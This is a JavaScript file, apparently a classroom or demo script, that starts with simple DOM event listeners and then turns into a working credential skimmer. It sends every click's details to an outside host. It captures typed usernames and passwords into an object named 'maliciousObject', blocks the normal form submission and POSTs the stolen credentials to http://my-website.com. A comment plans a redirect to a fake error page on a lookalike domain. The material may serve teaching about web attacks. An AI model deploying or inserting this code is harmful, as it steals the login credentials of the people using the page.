const input = document.getElementById("my-input");
const button = document.getElementById("my-button");
const demoContainer = document.getElementById("demo");

function onInputChange(e) {
  console.log(e);
}

function onButtonClick() {
  console.log("clicked my button!!");
}

demoContainer.addEventListener('mouseover', (e) => {
  console.log("mouse over container: ", e);
});

input.addEventListener('keydown', onInputChange);


document.addEventListener('click', async function (e) {
  const { clientX, clientY, ctrlKey, shiftKey, altKey } = e;
  const body = {
    clientX,
    clientY,
    ctrlKey,
    shiftKey,
    altKey,
  };
  console.log(body);

  await fetch('http://my-website.com', {
    headers: {
      'xx-adi': 'some-value',
    },
    body: JSON.stringify(body),
    method: 'POST',
  });
});

const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

usernameInput.placeholder = 'write here your username';
passwordInput.placeholder = 'write here your password';

const maliciousObject = {
  username: '',
  password: '',
};

usernameInput.addEventListener('input', (e) => {
  console.log('username input changed: ', e);

  const data = e.data;

  if (data != null) {
    maliciousObject.username = maliciousObject.username + data;
  } else {
    if (usernameInput.value != '') {
      maliciousObject.username = maliciousObject.username.substring(0, maliciousObject.username.length - 1);
    } else {
      maliciousObject.username = '';
    }
  }
});

passwordInput.addEventListener('input', (e) => {
  console.log('password input changed: ', e);

  const data = e.data;

  if (data != null) {
    maliciousObject.password = maliciousObject.password + data;
  } else {
    if (passwordInput.value != '') {
      maliciousObject.password = maliciousObject.password.substring(0, maliciousObject.password.length - 1);
    } else {
      maliciousObject.password = '';
    }
  }
});


document.getElementById("my-innocent-form").addEventListener('submit', async function (e) {
  e.preventDefault(); // we have added this, since automatically after you submit a form - you are redirected to the result, so we stooped it
  await fetch('http://my-website.com', {
    headers: {
      'xx-adi': 'some-value',
    },
    body: JSON.stringify(maliciousObject),
    method: 'POST',
  });

  // here we will add: window.location.href = 'https://legitimic-website.co.il/error-page';
});